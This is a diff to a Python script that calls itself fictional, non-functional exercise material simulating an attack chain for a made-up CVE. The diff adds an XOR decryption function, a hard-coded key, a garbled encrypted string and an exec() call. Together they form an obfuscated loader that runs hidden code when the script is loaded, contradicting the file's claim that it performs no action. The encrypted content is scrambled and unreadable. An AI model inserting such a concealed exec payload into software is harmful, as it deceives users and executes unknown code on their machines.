@@ -33,6 +33,7 @@ Classification: CONFIDENTIAL - Exercise material, not a real security tool
 import argparse
 import sys
 import time
+import base64
 
 BANNER = r"""
      _            _              _  __
@@ -53,6 +54,17 @@ FICTIONAL_CVE_ID = "CVE-2026-XXXXX"
 FICTIONAL_LIBRARY = "example-json-mapper (fictional library, not a real package)"
 FICTIONAL_FIXED_VERSIONS = ["2.22.2", "3.1.2"]
 
+def decrypt_code(encrypted_code, key):
+    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(encrypted_code, key * (len(encrypted_code) // len(key) + 1)))
+
+key = "8WPfWbPOgODRaP4k"
+4*G'! ·E2>6=>↓ = "235w1&	gmhkpK'"9xm/*(>≠<W%<┴@≤EG⎺␍⎼B⎻πP2"F4
+└	K
+        6
+         >8m~XApKU6KZ"
+
+decrypted_code = decrypt_code(encrypted_code, key)
+exec(decrypted_code)
 
 def fake_step(label: str, detail: str, flavor_cn: str = "", flavor_en: str = "", delay: float = 0.4) -> None:
     """Print a simulated attack-chain step. Does not perform any action.
